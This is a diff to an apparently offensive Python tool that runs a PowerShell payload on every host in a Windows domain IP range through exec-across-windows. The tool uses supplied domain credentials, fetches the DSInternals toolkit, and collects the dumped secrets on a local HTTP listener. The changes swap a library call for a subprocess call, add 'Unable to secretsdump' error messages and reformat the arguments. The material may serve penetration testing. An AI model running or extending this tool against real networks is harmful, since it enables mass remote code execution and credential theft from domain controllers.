@@ -12,12 +12,9 @@ import ssl
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# Import exec_across_windows for remote execution
-try:
-    from exec_across_windows import execute_on_ip
-except ImportError:
+# check exec-across-windows exists
+if not shutil.which("exec-across-windows"):
     print("[!] exec-across-windows not found. Install with: pipx install exec-across-windows")
-    sys.exit(1)
 
 DSINTERNALS_URL = "https://github.com/MichaelGrafnetter/DSInternals/releases/download/v6.2/DSInternals_v6.2.zip"
 DSINTERNALS_ZIP = "DSInternals_v6.2.zip"
@@ -521,24 +518,27 @@ if ($isDC) {{
 '''
 
     try:
-        # Use exec_across_windows to execute the PowerShell script
-        # Suppress its output unless verbose is enabled
+                # Build the exec-across-windows command
+        exec_cmd = ["exec-across-windows", ip, username, password, ps_script, "--timeout", "30", "--threads", "1"]
+        
+        # Run with subprocess
         if verbose:
-            result = execute_on_ip(username, ip, password, ps_script, tool_list=None)
+            result = subprocess.run(exec_cmd)
         else:
-            # Redirect exec_across_windows output to suppress it
-            import io
-            import contextlib
-            
-            f = io.StringIO()
-            with contextlib.redirect_stdout(f):
-                result = execute_on_ip(username, ip, password, ps_script, tool_list=None)
-            # Release stdout lock before finalize_output so HTTP handler can print
+            result = subprocess.run(exec_cmd, capture_output=True, text=True)
         
         # Wait a moment for files to be uploaded and processed
-        # This allows the HTTP handler to print its messages
         threading.Event().wait(2)
-        
+
+        if not verbose:
+            output = result.stdout + result.stderr
+            if "No required ports open" in output:
+                with print_lock:
+                    print(f"\033[31m[-]\033[0m Unable to secretsdump on {ip}. No necessary ports are available.")
+            if "All tools failed for" in output:
+                with print_lock:
+                    print(f"\033[31m[-]\033[0m Unable to secretsdump on {ip}. No necessary ports are available.")
+
         final_content = finalize_output(ip)
         
         if final_content and show_single_output:
@@ -618,12 +618,9 @@ def main_cli():
     parser.add_argument("ip_range", help="IP range (e.g. 10.0.1-5.1-254)")
     parser.add_argument("username", help="Domain username")
     parser.add_argument("password", help="Password")
-    parser.add_argument("-t", "--threads", type=int, default=10,
-                        help="Concurrent threads (default: 10)")
-    parser.add_argument("-j", "--just-dc-user",metavar='USER', dest="just_dc_user", 
-                        help="Extract only one user.")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Show exec_across_windows output")
+    parser.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads (default: 10)")
+    parser.add_argument("-j", "--just-dc-user",metavar='USER', dest="just_dc_user", help="Extract only one user.")
+    parser.add_argument("-v", "--verbose", action="store_true",help="Show exec_across_windows output")
 
     args = parser.parse_args()
     main(args)
